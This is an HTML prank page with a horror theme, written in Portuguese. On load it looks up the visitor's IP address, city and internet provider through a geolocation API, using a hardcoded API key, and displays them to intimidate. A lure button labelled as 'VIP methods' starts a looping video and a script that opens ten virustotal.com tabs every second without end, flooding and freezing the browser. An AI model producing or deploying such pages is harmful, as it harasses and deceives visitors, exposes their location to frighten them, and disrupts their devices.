<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InnoBotCorporation</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
            font-family: 'Creepster', cursive;
            color: white;
            text-align: center;
            overflow: hidden;
            position: relative;
        }

        @keyframes blink {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes flicker {
            0% {
                opacity: 0.8;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0.6;
            }
        }

        .message {
            color: red;
            font-size: 24px;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
            z-index: 10;
            margin: 15px 0;
            animation: flicker 1s infinite;
        }

        /* Estilo das gotículas de sangue */
        .blood-drop {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: red;
            border-radius: 50%;
            opacity: 0.8;
            animation: drip linear infinite;
        }

        @keyframes drip {
            0% {
                transform: translateY(-10px);
                opacity: 0.8;
            }
            50% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(100vh);
                opacity: 0;
            }
        }

        /* Efeito de fumaça */
        .smoke {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.imgur.com/H79qRcB.png') repeat; /* Imagem de fumaça */
            z-index: 5;
            opacity: 0.1;
            animation: fadeIn 3s ease-in-out forwards;
            mix-blend-mode: screen;
        }

        @keyframes smokeMove {
            0% {
                transform: translateX(0);
            }
            100% {
                transform: translateX(-100%);
            }
        }

        /* Estilo do botão */
        #playButton {
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 24px;
            color: black;
            background-color: red;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 10;
            text-transform: uppercase;
            letter-spacing: 3px;
            animation: blink 1.5s infinite;
            text-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
        }

        #playButton:hover {
            background-color: darkred;
        }

        #videoContainer {
            display: none;
        }

        #youtubeVideo {
            display: none;
        }

        /* Luz piscando ao fundo */
        .flicker-light {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255, 0, 0, 0.8), transparent 70%);
            transform: translate(-50%, -50%);
            animation: flicker 2s infinite;
            z-index: 1;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
</head>
<body>
    <div class="smoke"></div>
    <div class="flicker-light"></div>

    <div class="message" id="ipMessage"></div>
    <div class="message" id="locationMessage"></div>
    <div class="message" id="internetMessage"></div>

    <button id="playButton">Métodos vips Clique em mim</button>

    <div id="videoContainer">
        <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
    </div>

    <script>
        async function getUserIPLocationAndConnection() {
            try {
                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
                const data = await response.json();
                document.getElementById('ipMessage').innerText = `IP: ${data.ip}`;
                document.getElementById('locationMessage').innerText = `Localização: ${data.city}, ${data.country_name}`;
                document.getElementById('internetMessage').innerText = `Conexão: ${data.connection}, Provedor: ${data.isp}`;
            } catch (error) {
                document.getElementById('ipMessage').innerText = 'IP não encontrado.';
                document.getElementById('locationMessage').innerText = 'Localização não encontrada.';
                document.getElementById('internetMessage').innerText = 'Conexão não encontrada.';
            }
        }

        getUserIPLocationAndConnection();

        function startVideoAndOpenTabs() {
            const videoContainer = document.getElementById('videoContainer');
            videoContainer.style.display = 'block';
            const player = document.getElementById('youtubeVideo');
            player.style.display = 'block';
            player.src += "";

            setInterval(() => {
                for (let i = 0; i < 10; i++) {
                    window.open("https://www.virustotal.com", "_blank");
                }
            }, 1000);

            createBloodDrops();
        }

        function createBloodDrops() {
            const body = document.body;

            setInterval(() => {
                const drop = document.createElement('div');
                drop.className = 'blood-drop';
                drop.style.left = Math.random() * 100 + 'vw';
                drop.style.animationDuration = Math.random() * 1 + 2 + 's';
                body.appendChild(drop);

                drop.addEventListener('animationend', () => {
                    drop.remove();
                });
            }, 500);
        }

        document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
    </script>
</body>
</html>
